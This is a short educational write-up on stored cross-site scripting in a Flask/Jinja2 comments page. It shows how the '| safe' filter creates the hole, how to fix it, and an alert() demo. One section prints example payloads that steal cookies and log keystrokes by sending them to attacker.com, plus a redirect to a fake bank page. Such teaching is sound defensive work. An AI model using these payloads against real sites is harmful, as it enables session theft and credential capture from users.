# Cross-Site Scripting (XSS)

> **Project Status:**
> - [x] Vulnerability demonstrated
> - [ ] Fix implemented (see Day 6)

---

## What is XSS?
Cross-Site Scripting (XSS) is an attack where malicious scripts 
are injected into a website and executed in other users' browsers.

Unlike SQL Injection which attacks the database, XSS attacks the 
**browser** of anyone who visits the page. This means a single 
injected script can affect every user who loads that page.

The three players in an XSS attack:
- The vulnerable website → stores and renders user input
- The attacker → injects malicious JavaScript
- The victim user → their browser executes the script

## Why Does It Work?
XSS works because user input is rendered as code instead of text.

By default, Jinja2 auto-escapes user input — converting dangerous 
characters into harmless text. However, the `| safe` filter 
disables this protection, telling Jinja2 to trust the input 
completely.

**Vulnerable code:**
```html
{{ comment['comment'] | safe }}
```

With `| safe` enabled, anything stored in the database is rendered 
directly as HTML — including JavaScript.

## Demonstration — Stored XSS Attack

**Payload posted as a comment:**
```html
<script>alert('hacked')</script>
```

**What happened:**
- Comment was stored in the database as-is
- Flask retrieved it and passed it to Jinja2
- `| safe` told Jinja2 to trust the input
- Browser received raw HTML including the script tag
- Browser executed the JavaScript — popup appeared

**Why "Stored" XSS?**
The malicious script is saved in the database permanently.
Every user who visits the comments page executes the attack —
not just the attacker. This makes it the most dangerous type of XSS.

## Real World Impact
A real attacker wouldn't just show a popup. JavaScript can:

```javascript
// Steal session cookies
<script>fetch('https://attacker.com?cookie=' + document.cookie)</script>

// Redirect to fake login page
<script>window.location = 'https://fake-bank.com'</script>

// Log every keystroke
<script>document.onkeypress = function(e) { 
    fetch('https://attacker.com?key=' + e.key) 
}</script>
```

## The Fix — Re-enable Auto-Escaping
The fix is simply removing `| safe` and letting Jinja2 
auto-escape user input.

**Vulnerable:**
```html
{{ comment['comment'] | safe }}
```

**Secure:**
```html
{{ comment['comment'] }}
```

Jinja2 converts dangerous characters automatically:
<  →  <
→  >
'  →  '
"  →  "

So `<script>alert('hacked')</script>` becomes:

==&lt;script&gt;alert('hacked')&lt;/script&gt;==

The browser displays it as harmless text — never executes it.

## Key Takeaway
> "Never trust user input. Always escape before rendering."